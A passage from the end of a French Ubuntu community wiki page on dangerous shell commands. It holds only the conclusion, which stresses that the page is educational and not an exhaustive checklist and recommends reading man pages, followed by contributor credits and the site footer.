<div class='secedit editbutton_section editbutton_12'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Ajout d&#039;un mot de passe au compte] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="ajout_d_un_mot_de_passe_au_compte" /><input type="hidden" name="codeblockOffset" value="14" /><input type="hidden" name="range" value="10332-10599" /><button type="submit" title="Ajout d&#039;un mot de passe au compte" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
<h2 class="sectionedit13 page-header" id="conclusion">Conclusion</h2>
<div class="level2">

<p>
Encore une fois, il ne s&#039;agit pas de donner une liste complète des commandes malveillantes, et il ne faut pas utiliser cette page comme une liste de vérification pour déterminer si une commande est dangereuse ou pas ! Cette page est simplement éducative, pour faire prendre conscience à l&#039;utilisateur du danger potentiel du shell. Toute commande ne doit être exécutée que si elle est sûre et si l&#039;on comprend ce que l&#039;on fait.
</p>

<p>
Le meilleur moyen d&#039;évaluer les risques est probablement l&#039;utilisation de la commande <a href="/man" class="wikilink1" title="man">man</a>. 
</p>
<hr />

<p>
<em>Contributeurs principaux : <a href="/utilisateurs/%D0%BD%D0%B0_%D0%BA%D1%80%D0%B0%D1%8E" class="wikilink1" title="utilisateurs:на_краю">на_краю</a>, <a href="/utilisateurs/tshirtman" class="wikilink1" title="utilisateurs:tshirtman">tshirtman</a>, <a href="/utilisateurs/morgen_stern" class="wikilink1" title="utilisateurs:morgen_stern">morgen_stern</a>.</em>
</p>

<p>
<em>Basé sur « <a href="http://ubuntuforums.org/announcement.php?f=359" class="urlextern" title="http://ubuntuforums.org/announcement.php?f=359" rel="nofollow">ATTENTION ALL USERS: Malicious Commands</a> » par jdong.</em>
</p>

</div>
<div class='secedit editbutton_section editbutton_13'><form class="button btn_secedit form-inline" method="post" action="/commandes_dangereuses"><div class="no"><input type="hidden" name="do" value="edit" /><input type="hidden" name="rev" value="1620147064" /><input type="hidden" name="summary" value="[Conclusion] " /><input type="hidden" name="target" value="section" /><input type="hidden" name="hid" value="conclusion" /><input type="hidden" name="codeblockOffset" value="14" /><input type="hidden" name="range" value="10600-" /><button type="submit" title="Conclusion" class=" btn btn-default btn btn-xs btn-default">Modifier</button></div></form></div>
</div><!-- /CONTENT --></div>
          </div>
        </div>

        <div class="small text-right">

                    <span class="docInfo">
            <ul class="list-inline"><li><i class="fa fa-fw fa-file-text-o text-muted"></i> <span title="commandes_dangereuses.txt">commandes_dangereuses.txt</span></li><li><i class="fa fa-fw fa-calendar text-muted"></i> Dernière modification: <span title="Le 04/05/2021, 18:51">Le 04/05/2021, 18:51</span></li><li class="text-muted">par Amiralgaby</li></ul>          </span>
          
          
        </div>

      </article>

      
    </main>

    <footer id="dw__footer" class="navbar navbar-default">
  <div class="container">

    <div class="small navbar-text">

            <div class="footer-dw-title row">
        <div class="media col-sm-4">
          <!--<div class="media-left">
            <img src="/_media/logo.png" alt="Wiki ubuntu-fr" class="media-object" style="width:32px" />
          </div> -->
          <div class="media-body">
            <h4 class="media-heading">Documentation ubuntu-fr</h4>
            <p>
              Les pages de cette documentation sont rédigées par les utilisateurs
              pour les utilisateurs. Apportez-nous votre aide pour améliorer
              le contenu de cette documentation.
            </p>
          </div>
        </div>
        <div class="col-sm-4">
          <h4>Liens utiles</h4>
          <ul class="list-group list-unstyled">
            <li>
              <a href="/debutant" ><i class="fa fa-fw fa-child" style="font-size: 1.3em;"></i> Débuter sur Ubuntu</a>            </li>
            <li>
              <a href="/wiki/participer_wiki" ><i class="fa fa-fw fa-edit" style="font-size: 1.3em;"></i> Participer à la documentation</a>            </li>
            <li>
              <a href="/documentation_hors_ligne" ><i class="fa fa-fw fa-book" style="font-size: 1.3em;"></i> Documentation hors ligne</a>            </li>
            <li>
              <a href="//www.ubuntu-fr.org/telechargement" ><i class="fa fa-fw fa-arrow-circle-down" style="font-size: 1.3em;"></i> Télécharger Ubuntu</a>            </li>
          </ul>
        </div>
        <div class="col-sm-4">
          <h4>Obtenir de l'aide</h4>
          <ul class="list-group list-unstyled">
            <li>
              <a href="/tutoriel/comment_obtenir_une_reponse_satisfaisante" ><i class="fa fa-fw fa-info-circle" style="font-size: 1.3em;"></i> Chercher de l'aide</a>            </li>
            <li>
              <a href="//doc.ubuntu-fr.org/" ><i class="fa fa-fw fa-book" style="font-size: 1.3em;"></i> Consulter la documentation</a>            </li>
            <li>
              <a href="//forum.ubuntu-fr.org/" ><i class="fa fa-fw fa-comments" style="font-size: 1.3em;"></i> Consulter le Forum</a>            </li>
            <li>
              <a href="//guide.ubuntu-fr.org/" ><i class="fa fa-fw fa-question-circle" style="font-size: 1.3em;"></i> Lisez le guide</a>            </li>
          </ul>
        </div>
        <p>&nbsp;</p>
      </div>
      
      
      <div class="footer-license row">

        <div class="col-sm-6">
                    <p>
            <a href="http://creativecommons.org/licenses/by-sa/3.0/deed.fr" title="CC Paternité-Partage des Conditions Initiales à l'Identique 3.0 Unported" target="" itemscope itemtype="http://schema.org/CreativeWork" itemprop="license" rel="license" class="license"><img src="/lib/tpl/bootstrap3/images/license/cc.png" width="24" height="24" alt="cc" /> <img src="/lib/tpl/bootstrap3/images/license/by.png" width="24" height="24" alt="by" /> <img src="/lib/tpl/bootstrap3/images/license/sa.png" width="24" height="24" alt="sa" /> </a>          </p>
          <p class="small">
            Sauf mention contraire, le contenu de ce wiki est placé sous les termes de la licence suivante :<br/><a href="http://creativecommons.org/licenses/by-sa/3.0/deed.fr" title="CC Paternité-Partage des Conditions Initiales à l'Identique 3.0 Unported" target="" itemscope itemtype="http://schema.org/CreativeWork" itemprop="license" rel="license" class="license">CC Paternité-Partage des Conditions Initiales à l'Identique 3.0 Unported</a>          </p>
                  </div>

        <div class="col-sm-6">
                    <ul id="dw__badges" class="list-inline text-right hidden-print">

  <li>
    <a href="https://www.dokuwiki.org/template:bootstrap3" title="Bootstrap template for DokuWiki" target="">
      <img src="/lib/tpl/bootstrap3/images/bootstrap.png" width="20" alt="Bootstrap template for DokuWiki" />
    </a>
  </li>

  <li>
    <a href="https://www.php.net" title="Powered by PHP" target="">
      <img src="/lib/tpl/bootstrap3/images/php.png" width="20" alt="Powered by PHP" />
    </a>
  </li>

  <li>
    <a href="http://validator.w3.org/check/referer" title="Valid HTML5" target="">
      <img src="/lib/tpl/bootstrap3/images/html5.png" width="20" alt="Valid HTML5" />
    </a>
  </li>

  <li>
    <a href="http://jigsaw.w3.org/css-validator/check/referer?profile=css3" title="Valid CSS" target="">
      <img src="/lib/tpl/bootstrap3/images/css3.png" width="20" alt="Valid CSS" />
    </a>
  </li>

  <li>
    <a href="https://www.dokuwiki.org/" title="Driven by DokuWiki" target="">
      <img src="/lib/tpl/bootstrap3/images/logo.png" width="20" alt="Driven by DokuWiki" />
    </a>
  </li>

</ul>
                  </div>

      </div>

    </div>

  </div>
</footer>
<img src="/lib/exe/indexer.php?id=commandes_dangereuses&amp;1635547406" width="2" height="1" alt="" />
    <a href="#dokuwiki__top" class="back-to-top hidden-print btn btn-default btn-sm" title="Aller au contenu" accesskey="t"><i class="fa fa-chevron-up"></i></a>

    <div id="screen__mode">      <span class="visible-xs-block"></span>
      <span class="visible-sm-block"></span>
      <span class="visible-md-block"></span>
      <span class="visible-lg-block"></span>
    </div>

  </div>

    <!-- Piwik -->
		<script type="text/javascript">
		  var _paq = _paq || [];
		  _paq.push(["setDomains", ["*.doc.ubuntu-fr.org","*.doc.edubuntu-fr.org","*.doc.lubuntu-fr.org","*.doc.xubuntu-fr.org","*.doc.edubuntu-fr.org","*.doc.lubuntu-fr.org","*.doc.ubuntu-fr.org","*.doc.xubuntu-fr.org"]]);
		  _paq.push(['trackPageView']);
		  _paq.push(['enableLinkTracking']);
		  (function() {
		    var u="//piwik.ubuntu-fr.org/";
		    _paq.push(['setTrackerUrl', u+'piwik.php']);
		    _paq.push(['setSiteId', 3]);
		    var d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];
		    g.type='text/javascript'; g.async=true; g.defer=true; g.src=u+'piwik.js'; s.parentNode.insertBefore(g,s);
		  })();
		</script>
		<noscript><p><img src="//piwik.ubuntu-fr.org/piwik.php?idsite=3" style="border:0;" alt="" /></p></noscript>
		<!-- End Piwik Code -->

</body>
</html>
